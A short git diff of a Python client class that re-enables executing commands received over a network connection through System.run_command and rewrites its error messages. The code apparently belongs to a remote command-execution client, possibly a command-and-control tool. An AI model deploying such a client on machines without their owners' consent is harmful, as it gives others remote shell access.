@@ -106,8 +106,8 @@ class MClient:
             print(f"[Client (run-command)]results: {system_command}")
 
             ## broekn
-            #return System.run_command(system_command)
-            return "This is where a run-command result would go IF not fcking broken"
+            return System.run_command(system_command)
+            #return "This is where a run-command result would go IF not fcking broken"
 
     @staticmethod
     def generate_client_id():
@@ -259,9 +259,9 @@ class System:
                 universal_newlines=True)
             return output
         except subprocess.CalledProcessError as exc:
-            return f"{exc.returncode, exc.output}"
+            return f"[run_command] Err: {exc.returncode, exc.output}"
         except Exception as e:
-            return f"[CompilationWrapper(GCC: compile)] Unknown Error when compiling: {e}"
+            return f"[run_command] Unknown Error: {e}"
 
 #client = MClient(ip="IPADDRESS",port=PORT)
 
